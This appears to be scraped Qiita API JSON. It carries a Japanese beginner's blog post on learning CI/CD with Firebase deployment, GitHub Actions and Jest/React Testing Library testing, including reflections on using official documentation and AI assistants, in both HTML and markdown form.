リベースの仕組み\n\nこういうもんだという理解だけはできた\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/af3c98ca-5d01-4352-950f-9f306fafac31.png)\n\n\n","coediting":false,"comments_count":0,"created_at":"2025-03-16T18:40:09+09:00","group":null,"id":"2bd49cec1b54bedeb5f5","likes_count":0,"private":true,"reactions_count":0,"stocks_count":0,"tags":[{"name":"Git","versions":[]},{"name":"リファレンス","versions":[]}],"title":"Gitコマンドリファレンス","updated_at":"2025-03-20T10:43:50+09:00","url":"https://qiita.com/asa129/private/2bd49cec1b54bedeb5f5","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":47,"team_membership":null,"organization_url_name":null,"slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:30\">\n<span id=\"hatching_chickはじめに\" class=\"fragment\"></span><a href=\"#hatching_chick%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a><img alt=\":hatching_chick:\" class=\"emoji\" height=\"20\" src=\"https://cdn.qiita.com/emoji/twemoji/unicode/1f423.png\" title=\":hatching_chick:\" width=\"20\" loading=\"lazy\">はじめに</h1>\n<p data-sourcepos=\"2:1-3:119\">CI/CDというワードをご存知でしょうか…？<br>\n私は知りませんでした。今回はCI/CDに入門して得られたことについてまとめてみました。</p>\n<h1 data-sourcepos=\"5:1-5:27\">\n<span id=\"wrenchcicdとは\" class=\"fragment\"></span><a href=\"#wrenchcicd%E3%81%A8%E3%81%AF\"><i class=\"fa fa-link\"></i></a><img alt=\":wrench:\" class=\"emoji\" height=\"20\" src=\"https://cdn.qiita.com/emoji/twemoji/unicode/1f527.png\" title=\":wrench:\" width=\"20\" loading=\"lazy\">CI/CDとは…？</h1>\n<blockquote data-sourcepos=\"7:1-9:96\">\n<p data-sourcepos=\"7:3-9:96\"><strong>wikipediaより引用</strong><br>\n継続的インテグレーションと継続的デリバリーまたは継続的デプロイのいずれかを組み合わせたプラクティスを指す<br>\nアプリケーションの構築、テスト、および展開の自動化を実施すること</p>\n</blockquote>\n<p data-sourcepos=\"11:1-12:165\">ここで私は、<code>デプロイやテストの自動化…？どういうこと？</code>という感覚に陥りました。<br>\n私は、デプロイはベテランエンジニアやリーダーが行うもの、テストは手でポチポチ打鍵するものと思っていたからです。</p>\n<p data-sourcepos=\"14:1-15:75\">調べていくと、<strong>CI/CDを導入すると、コードを書いてプッシュするだけで自動的にテストとデプロイできる</strong>ことがわかりました。かなり時短・便利です。<br>\nそんなことできるのかとこの時点では半信半疑でした。</p>\n<h1 data-sourcepos=\"17:1-17:27\">\n<span id=\"beginner行ったこと\" class=\"fragment\"></span><a href=\"#beginner%E8%A1%8C%E3%81%A3%E3%81%9F%E3%81%93%E3%81%A8\"><i class=\"fa fa-link\"></i></a><img alt=\":beginner:\" class=\"emoji\" height=\"20\" src=\"https://cdn.qiita.com/emoji/twemoji/unicode/1f530.png\" title=\":beginner:\" width=\"20\" loading=\"lazy\">行ったこと</h1>\n<h2 data-sourcepos=\"18:1-18:59\">\n<span id=\"1-firebaseを使ってアプリのデプロイを実現\" class=\"fragment\"></span><a href=\"#1-firebase%E3%82%92%E4%BD%BF%E3%81%A3%E3%81%A6%E3%82%A2%E3%83%97%E3%83%AA%E3%81%AE%E3%83%87%E3%83%97%E3%83%AD%E3%82%A4%E3%82%92%E5%AE%9F%E7%8F%BE\"><i class=\"fa fa-link\"></i></a>1. Firebaseを使ってアプリのデプロイを実現</h2>\n<p data-sourcepos=\"19:1-19:144\">まず、自分で作った学習記録アプリを<strong>Firebase</strong>というサービスを使ってデプロイをすることを行いました。</p>\n<p data-sourcepos=\"22:1-22:34\"><iframe id=\"qiita-embed-content__2fd839048d76dfe8ae7e076f1e3bbacf\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__2fd839048d76dfe8ae7e076f1e3bbacf\" data-content=\"https%3A%2F%2Ffirebase.google.com%2F%3Fhl%3Dja\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"24:1-24:90\">自分で作った学習記録アプリについてはこちらで紹介しています。</p>\n<p data-sourcepos=\"26:1-26:51\"><iframe id=\"qiita-embed-content__e7dd07b099e02379b5a4d5725e8b249d\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__e7dd07b099e02379b5a4d5725e8b249d\" data-content=\"https%3A%2F%2Fqiita.com%2Fasa129%2Fitems%2F642e7d4e0eb9529cf402\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"28:1-28:69\">以下の記事を参考に、デプロイを実現させました。</p>\n<p data-sourcepos=\"30:1-30:69\"><iframe id=\"qiita-embed-content__7084c26941be2e9532cc93a8b8e21628\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__7084c26941be2e9532cc93a8b8e21628\" data-content=\"https%3A%2F%2Fzenn.dev%2Fyumemi_inc%2Farticles%2F2020-10-06-react-firebase-deploy\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"32:1-33:152\">初めて、自らデプロイできたときは思わず自室で「おおおお！」と声を出してしまいました。<br>\n今まで<code>ベテラン勢が行うもので、自分には縁がない</code>と思っていたことを、数時間でできたことに感動しました。</p>\n<h2 data-sourcepos=\"35:1-35:76\">\n<span id=\"2-github-actionsを利用してcd継続的デリバリーを構築\" class=\"fragment\"></span><a href=\"#2-github-actions%E3%82%92%E5%88%A9%E7%94%A8%E3%81%97%E3%81%A6cd%E7%B6%99%E7%B6%9A%E7%9A%84%E3%83%87%E3%83%AA%E3%83%90%E3%83%AA%E3%83%BC%E3%82%92%E6%A7%8B%E7%AF%89\"><i class=\"fa fa-link\"></i></a>2. GitHub Actionsを利用してCD（継続的デリバリー）を構築</h2>\n<p data-sourcepos=\"36:1-36:128\"><strong>GitHub Actions</strong>を使ってコードをpushするだけで<strong>自動的にデプロイ</strong>ができることを知りました。</p>\n<p data-sourcepos=\"38:1-38:97\">以下の記事を参考に、GithubActionsのワークフローの仕組み、作り方を理解</p>\n<p data-sourcepos=\"40:1-40:50\"><iframe id=\"qiita-embed-content__78ba51c5922a7e7f744980c17aa4731b\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__78ba51c5922a7e7f744980c17aa4731b\" data-content=\"https%3A%2F%2Fqiita.com%2FTeach%2Fitems%2Fd2c4d7bec98228df1807\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"42:1-42:124\">ドキュメントを読みつつ、pushするだけで自動デプロイが行われるように挑戦してみました。</p>\n<p data-sourcepos=\"44:1-44:34\"><iframe id=\"qiita-embed-content__eb46ccd9188b8a10cfb7f0ac32849afc\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__eb46ccd9188b8a10cfb7f0ac32849afc\" data-content=\"https%3A%2F%2Fdocs.github.com%2Fja%2Factions\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"46:1-47:54\">全くうまくいかず、何度もエラーに悩まされました。<br>\nその時の格闘を下記にまとめています。</p>\n<p data-sourcepos=\"49:1-49:51\"><iframe id=\"qiita-embed-content__1d63edb3eafe3283e77c04b3bf0eb085\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__1d63edb3eafe3283e77c04b3bf0eb085\" data-content=\"https%3A%2F%2Fqiita.com%2Fasa129%2Fitems%2F65e301521f49e17ec11f\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h2 data-sourcepos=\"52:1-52:157\">\n<span id=\"3-jestとreact-testing-libraryを使ってテストケースを作成githubactionsと合わせてci継続的インテグレーションを実現\" class=\"fragment\"></span><a href=\"#3-jest%E3%81%A8react-testing-library%E3%82%92%E4%BD%BF%E3%81%A3%E3%81%A6%E3%83%86%E3%82%B9%E3%83%88%E3%82%B1%E3%83%BC%E3%82%B9%E3%82%92%E4%BD%9C%E6%88%90githubactions%E3%81%A8%E5%90%88%E3%82%8F%E3%81%9B%E3%81%A6ci%E7%B6%99%E7%B6%9A%E7%9A%84%E3%82%A4%E3%83%B3%E3%83%86%E3%82%B0%E3%83%AC%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%92%E5%AE%9F%E7%8F%BE\"><i class=\"fa fa-link\"></i></a>3. JestとReact Testing Libraryを使ってテストケースを作成、GithubActionsと合わせてCI（継続的インテグレーション）を実現</h2>\n<p data-sourcepos=\"54:1-56:51\"><code>CIってそもそもどのようにしたらいいのか？</code>という状態からのスタートでした。<br>\n方向性が皆目見当つかなかったため、ChatGPTに相談し、<br>\n以下の流れで進めることにしました。</p>\n<ol data-sourcepos=\"58:1-62:0\">\n<li data-sourcepos=\"58:1-58:85\">CIで使用するJestとReact Testing Library がそもそも何なのかを理解</li>\n<li data-sourcepos=\"59:1-59:91\">JestとReact Testing Libraryの基本的なテストコードの書き方を理解する</li>\n<li data-sourcepos=\"60:1-60:75\">自分で作ったプロジェクトにテストを組み込んで見る</li>\n<li data-sourcepos=\"61:1-62:0\">GitHub Actionsを使ってpush時にテストが実行されるようにする</li>\n</ol>\n<p data-sourcepos=\"63:1-63:63\">学習したことは下記の記事でまとめています。</p>\n<p data-sourcepos=\"65:1-65:51\"><iframe id=\"qiita-embed-content__24e6964023be0d7bf1b6e141d0a791a5\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__24e6964023be0d7bf1b6e141d0a791a5\" data-content=\"https%3A%2F%2Fqiita.com%2Fasa129%2Fitems%2Fb4962b1a353905e4bb5a\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h1 data-sourcepos=\"69:1-69:68\">\n<span id=\"pencil2入門してみて得られたこと気づいたこと\" class=\"fragment\"></span><a href=\"#pencil2%E5%85%A5%E9%96%80%E3%81%97%E3%81%A6%E3%81%BF%E3%81%A6%E5%BE%97%E3%82%89%E3%82%8C%E3%81%9F%E3%81%93%E3%81%A8%E6%B0%97%E3%81%A5%E3%81%84%E3%81%9F%E3%81%93%E3%81%A8\"><i class=\"fa fa-link\"></i></a><img alt=\":pencil2:\" class=\"emoji\" height=\"20\" src=\"https://cdn.qiita.com/emoji/twemoji/unicode/270f-fe0f.png\" title=\":pencil2:\" width=\"20\" loading=\"lazy\">入門してみて得られたこと、気づいたこと</h1>\n<h2 data-sourcepos=\"70:1-70:57\">\n<span id=\"自分なりの問題解決フローを構築できた\" class=\"fragment\"></span><a href=\"#%E8%87%AA%E5%88%86%E3%81%AA%E3%82%8A%E3%81%AE%E5%95%8F%E9%A1%8C%E8%A7%A3%E6%B1%BA%E3%83%95%E3%83%AD%E3%83%BC%E3%82%92%E6%A7%8B%E7%AF%89%E3%81%A7%E3%81%8D%E3%81%9F\"><i class=\"fa fa-link\"></i></a>自分なりの問題解決フローを構築できた</h2>\n<p data-sourcepos=\"72:1-72:176\">行き詰まった時、自分の行動パターンを見直しました。そこで気づいたのは、<code>「目的意識を持って行動する」</code>ことの重要性です。</p>\n<p data-sourcepos=\"74:1-74:75\">具体的に以下のアプローチで解決するようになりました</p>\n<ol data-sourcepos=\"76:1-81:0\">\n<li data-sourcepos=\"76:1-77:68\">まず課題を決める<br>\n課題の決め方がわからないときはAIや有識者に頼る</li>\n<li data-sourcepos=\"78:1-79:65\">解決するための選択肢を出してみる<br>\n解決策や選択肢がでないときはAIや有識者に頼る</li>\n<li data-sourcepos=\"80:1-81:0\">実践する</li>\n</ol>\n<p data-sourcepos=\"82:1-82:144\">「目的意識を持って行動する」ことでやみくもに何かをする、勉強をするという状態から脱出できました。</p>\n<h2 data-sourcepos=\"84:1-84:60\">\n<span id=\"book公式ドキュメントを読むことの大切さ\" class=\"fragment\"></span><a href=\"#book%E5%85%AC%E5%BC%8F%E3%83%89%E3%82%AD%E3%83%A5%E3%83%A1%E3%83%B3%E3%83%88%E3%82%92%E8%AA%AD%E3%82%80%E3%81%93%E3%81%A8%E3%81%AE%E5%A4%A7%E5%88%87%E3%81%95\"><i class=\"fa fa-link\"></i></a><img alt=\":book:\" class=\"emoji\" height=\"20\" src=\"https://cdn.qiita.com/emoji/twemoji/unicode/1f4d6.png\" title=\":book:\" width=\"20\" loading=\"lazy\">公式ドキュメントを読むことの大切さ</h2>\n<p data-sourcepos=\"85:1-86:172\">公式ドキュメントは体系的に記載されています。<br>\n<code>まずは公式ドキュメントを参照する、読むことを軸にする習慣</code>をつけたことで、<code>概念を理解しやすくなった</code>と感じています。</p>\n<p data-sourcepos=\"88:1-90:203\">ドキュメントは文字量が多く最初は圧倒されました。<br>\n何から読んだらいいかわからない状態にもなりました。<br>\n<code>クイックスタートや目次を読む（項目だけよんで中身はわかんなくてもまあいいやぐらいの雰囲気で読む）</code>ことを意識することで抵抗が減りました。</p>\n<h2 data-sourcepos=\"94:1-94:30\">\n<span id=\"robotaiの力を借りる\" class=\"fragment\"></span><a href=\"#robotai%E3%81%AE%E5%8A%9B%E3%82%92%E5%80%9F%E3%82%8A%E3%82%8B\"><i class=\"fa fa-link\"></i></a><img alt=\":robot:\" class=\"emoji\" height=\"20\" src=\"https://cdn.qiita.com/emoji/twemoji/unicode/1f916.png\" title=\":robot:\" width=\"20\" loading=\"lazy\">AIの力を借りる</h2>\n<p data-sourcepos=\"96:1-97:235\">私の最も大きな発見は、<strong>AIの力を借りる</strong>ということでした。<br>\nそれまでは<code>「自分で解決策を調べて試行錯誤するのが当たり前」</code>と思っていましたが、適切にAIを活用することで問題解決までの時間が大幅に短縮できることを学びました。</p>\n<p data-sourcepos=\"99:1-101:114\"><strong>例えば：</strong><br>\n<strong>ChatGPTやClaudeに質問して、アプローチや方向性を得る</strong><br>\nCIを実現するために考えた方法もchatgptに聞いてアプローチを得ることができました。</p>\n<p data-sourcepos=\"103:1-103:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F33fe7902-8b41-425a-9cf6-a0fa0415e3d9.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=eb66a0dc4d559340767d3ae024cd48d4\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F33fe7902-8b41-425a-9cf6-a0fa0415e3d9.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=eb66a0dc4d559340767d3ae024cd48d4\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F33fe7902-8b41-425a-9cf6-a0fa0415e3d9.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=5f336133d3daf5bcd38aba5ad53c5dc7 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/33fe7902-8b41-425a-9cf6-a0fa0415e3d9.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"105:1-105:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F600fc917-4542-46d5-aca2-7e0323b037cd.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=158fdf90c46ad7e98171143826b0e813\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F600fc917-4542-46d5-aca2-7e0323b037cd.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=158fdf90c46ad7e98171143826b0e813\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F600fc917-4542-46d5-aca2-7e0323b037cd.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=233f2216724c501f97f24c44bd738836 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/600fc917-4542-46d5-aca2-7e0323b037cd.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"110:1-111:116\"><strong>エラーなどはGitHub Copilotを使って解決やリファクタリングのヒントを得る</strong><br>\nエラーの解決方法や、処理の実現方法がわからないときはGitHub Copilotに質問しました。</p>\n<p data-sourcepos=\"113:1-113:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F37dfd8f9-6ded-4d6a-be58-daa275953dcd.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=618ff863bb26caedd41d293fd594476c\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F37dfd8f9-6ded-4d6a-be58-daa275953dcd.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=618ff863bb26caedd41d293fd594476c\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F37dfd8f9-6ded-4d6a-be58-daa275953dcd.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=0fae4e7b79c5ca150ff0b7297d8f8b91 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/37dfd8f9-6ded-4d6a-be58-daa275953dcd.png\" loading=\"lazy\"></a></p>\n<h3 data-sourcepos=\"117:1-117:129\">\n<span id=\"aiに頼っても基本的な概念や仕組みの理解ができていないと同じエラーの堂々巡りになる\" class=\"fragment\"></span><a href=\"#ai%E3%81%AB%E9%A0%BC%E3%81%A3%E3%81%A6%E3%82%82%E5%9F%BA%E6%9C%AC%E7%9A%84%E3%81%AA%E6%A6%82%E5%BF%B5%E3%82%84%E4%BB%95%E7%B5%84%E3%81%BF%E3%81%AE%E7%90%86%E8%A7%A3%E3%81%8C%E3%81%A7%E3%81%8D%E3%81%A6%E3%81%84%E3%81%AA%E3%81%84%E3%81%A8%E5%90%8C%E3%81%98%E3%82%A8%E3%83%A9%E3%83%BC%E3%81%AE%E5%A0%82%E3%80%85%E5%B7%A1%E3%82%8A%E3%81%AB%E3%81%AA%E3%82%8B\"><i class=\"fa fa-link\"></i></a>AIに頼っても、基本的な概念や仕組みの理解ができていないと、同じエラーの堂々巡りになる</h3>\n<p data-sourcepos=\"119:1-120:241\">AIの助言でわからない処理やメソッドが出たときは公式ドキュメントを参照することを意識して行っていました。<br>\n私の場合、エラーに遭遇する度、また非同期処理関連のエラー…となることが多く、<code>基本的な概念の理解が不足していると、AIの助言だけでは解決できない</code>問題に直面しました。</p>\n<p data-sourcepos=\"122:1-122:99\">非同期処理については自分なりに学習したことを下記にまとめています。</p>\n<p data-sourcepos=\"124:1-124:51\"><iframe id=\"qiita-embed-content__214d11dcfc9a21bcd4943da289dbb376\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__214d11dcfc9a21bcd4943da289dbb376\" data-content=\"https%3A%2F%2Fqiita.com%2Fasa129%2Fitems%2Fa79231425296e507c8bf\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h1 data-sourcepos=\"130:1-130:29\">\n<span id=\"hatched_chickおわりに\" class=\"fragment\"></span><a href=\"#hatched_chick%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a><img alt=\":hatched_chick:\" class=\"emoji\" height=\"20\" src=\"https://cdn.qiita.com/emoji/twemoji/unicode/1f425.png\" title=\":hatched_chick:\" width=\"20\" loading=\"lazy\">おわりに</h1>\n<p data-sourcepos=\"131:1-134:105\">今回、CI/CDの導入を通して、開発からデプロイまでのイメージがついたと感じています。<br>\n私の中で<code>リリースを自ら行えること・自動化できたこと</code>は自信になったと感じています。<br>\n余談ですが、目的をもって行動するを意識するようになったことで晩御飯を作る時間が短くなりました。<br>\n（これを作るぞって決めて手順を考えた後に行動しているからでしょうか？）</p>\n<h1 data-sourcepos=\"136:1-136:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"138:1-138:358\"><iframe id=\"qiita-embed-content__a3b969ce1c5f4586e8daf12c566b80e7\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__a3b969ce1c5f4586e8daf12c566b80e7\" data-content=\"https%3A%2F%2Fja.wikipedia.org%2Fwiki%2FCI%2FCD%23%3A%7E%3Atextframeborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"141:1-141:69\"><iframe id=\"qiita-embed-content__f16313a5b0319aae9f4dcaf2ea88a55c\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__f16313a5b0319aae9f4dcaf2ea88a55c\" data-content=\"https%3A%2F%2Fzenn.dev%2Fyumemi_inc%2Farticles%2F2020-10-06-react-firebase-deploy\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"144:1-144:50\"><iframe id=\"qiita-embed-content__e40c7504405b21d2312e966f8e18133d\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__e40c7504405b21d2312e966f8e18133d\" data-content=\"https%3A%2F%2Fqiita.com%2FTeach%2Fitems%2Fd2c4d7bec98228df1807\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"147:1-147:34\"><iframe id=\"qiita-embed-content__9967f0b166085d4aaed352f7b69ad6f4\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__9967f0b166085d4aaed352f7b69ad6f4\" data-content=\"https%3A%2F%2Fdocs.github.com%2Fja%2Factions\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h1 data-sourcepos=\"149:1-149:34\">\n<span id=\"jisouのメンバー募集中\" class=\"fragment\"></span><a href=\"#jisou%E3%81%AE%E3%83%A1%E3%83%B3%E3%83%90%E3%83%BC%E5%8B%9F%E9%9B%86%E4%B8%AD\"><i class=\"fa fa-link\"></i></a>JISOUのメンバー募集中！</h1>\n<p data-sourcepos=\"150:1-153:9\">プログラミングコーチングJISOUでは、新たなメンバーを募集しています。<br>\n日本一のアウトプットコミュニティでキャリアアップしませんか？<br>\n興味のある方は、ぜひホームページをのぞいてみてください！<br>\n▼▼▼</p>\n<p data-sourcepos=\"155:1-155:19\"><iframe id=\"qiita-embed-content__9b8d8374a6defb9c7271afab9b8cfcd4\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__9b8d8374a6defb9c7271afab9b8cfcd4\" data-content=\"https%3A%2F%2Fprojisou.jp\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# :hatching_chick:はじめに\nCI/CDというワードをご存知でしょうか…？\n私は知りませんでした。今回はCI/CDに入門して得られたことについてまとめてみました。\n\n# :wrench:CI/CDとは…？\n\n> **wikipediaより引用**\n継続的インテグレーションと継続的デリバリーまたは継続的デプロイのいずれかを組み合わせたプラクティスを指す\nアプリケーションの構築、テスト、および展開の自動化を実施すること\n\nここで私は、`デプロイやテストの自動化…？どういうこと？`という感覚に陥りました。\n私は、デプロイはベテランエンジニアやリーダーが行うもの、テストは手でポチポチ打鍵するものと思っていたからです。\n\n調べていくと、**CI/CDを導入すると、コードを書いてプッシュするだけで自動的にテストとデプロイできる**ことがわかりました。かなり時短・便利です。\nそんなことできるのかとこの時点では半信半疑でした。\n\n# :beginner:行ったこと\n## 1. Firebaseを使ってアプリのデプロイを実現\nまず、自分で作った学習記録アプリを**Firebase**というサービスを使ってデプロイをすることを行いました。\n\n\nhttps://firebase.google.com/?hl=ja\n\n自分で作った学習記録アプリについてはこちらで紹介しています。\n\nhttps://qiita.com/asa129/items/642e7d4e0eb9529cf402\n\n以下の記事を参考に、デプロイを実現させました。\n\nhttps://zenn.dev/yumemi_inc/articles/2020-10-06-react-firebase-deploy\n\n初めて、自らデプロイできたときは思わず自室で「おおおお！」と声を出してしまいました。\n今まで`ベテラン勢が行うもので、自分には縁がない`と思っていたことを、数時間でできたことに感動しました。\n\n## 2. GitHub Actionsを利用してCD（継続的デリバリー）を構築\n**GitHub Actions**を使ってコードをpushするだけで**自動的にデプロイ**ができることを知りました。\n\n以下の記事を参考に、GithubActionsのワークフローの仕組み、作り方を理解\n\nhttps://qiita.com/Teach/items/d2c4d7bec98228df1807\n\nドキュメントを読みつつ、pushするだけで自動デプロイが行われるように挑戦してみました。\n\nhttps://docs.github.com/ja/actions\n\n全くうまくいかず、何度もエラーに悩まされました。\nその時の格闘を下記にまとめています。\n\nhttps://qiita.com/asa129/items/65e301521f49e17ec11f\n\n\n## 3. JestとReact Testing Libraryを使ってテストケースを作成、GithubActionsと合わせてCI（継続的インテグレーション）を実現\n\n`CIってそもそもどのようにしたらいいのか？`という状態からのスタートでした。\n方向性が皆目見当つかなかったため、ChatGPTに相談し、\n以下の流れで進めることにしました。\n\n1. CIで使用するJestとReact Testing Library がそもそも何なのかを理解\n2. JestとReact Testing Libraryの基本的なテストコードの書き方を理解する\n3. 自分で作ったプロジェクトにテストを組み込んで見る\n4. GitHub Actionsを使ってpush時にテストが実行されるようにする\n\n学習したことは下記の記事でまとめています。\n\nhttps://qiita.com/asa129/items/b4962b1a353905e4bb5a\n\n\n\n# :pencil2:入門してみて得られたこと、気づいたこと\n## 自分なりの問題解決フローを構築できた\n\n行き詰まった時、自分の行動パターンを見直しました。そこで気づいたのは、`「目的意識を持って行動する」`ことの重要性です。\n\n具体的に以下のアプローチで解決するようになりました\n\n1. まず課題を決める\n課題の決め方がわからないときはAIや有識者に頼る\n2. 解決するための選択肢を出してみる\n解決策や選択肢がでないときはAIや有識者に頼る\n3. 実践する\n\n「目的意識を持って行動する」ことでやみくもに何かをする、勉強をするという状態から脱出できました。\n\n## :book:公式ドキュメントを読むことの大切さ\n公式ドキュメントは体系的に記載されています。\n`まずは公式ドキュメントを参照する、読むことを軸にする習慣`をつけたことで、`概念を理解しやすくなった`と感じています。\n\nドキュメントは文字量が多く最初は圧倒されました。\n何から読んだらいいかわからない状態にもなりました。\n`クイックスタートや目次を読む（項目だけよんで中身はわかんなくてもまあいいやぐらいの雰囲気で読む）`ことを意識することで抵抗が減りました。\n\n\n\n## :robot:AIの力を借りる\n\n私の最も大きな発見は、**AIの力を借りる**ということでした。\nそれまでは`「自分で解決策を調べて試行錯誤するのが当たり前」`と思っていましたが、適切にAIを活用することで問題解決までの時間が大幅に短縮できることを学びました。\n\n**例えば：**\n**ChatGPTやClaudeに質問して、アプローチや方向性を得る**\nCIを実現するために考えた方法もchatgptに聞いてアプローチを得ることができました。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/33fe7902-8b41-425a-9cf6-a0fa0415e3d9.png)\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/600fc917-4542-46d5-aca2-7e0323b037cd.png)\n\n\n\n\n**エラーなどはGitHub Copilotを使って解決やリファクタリングのヒントを得る**\nエラーの解決方法や、処理の実現方法がわからないときはGitHub Copilotに質問しました。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/37dfd8f9-6ded-4d6a-be58-daa275953dcd.png)\n\n\n\n### AIに頼っても、基本的な概念や仕組みの理解ができていないと、同じエラーの堂々巡りになる\n\nAIの助言でわからない処理やメソッドが出たときは公式ドキュメントを参照することを意識して行っていました。\n私の場合、エラーに遭遇する度、また非同期処理関連のエラー…となることが多く、`基本的な概念の理解が不足していると、AIの助言だけでは解決できない`問題に直面しました。\n\n非同期処理については自分なりに学習したことを下記にまとめています。\n\nhttps://qiita.com/asa129/items/a79231425296e507c8bf\n\n\n\n\n\n# 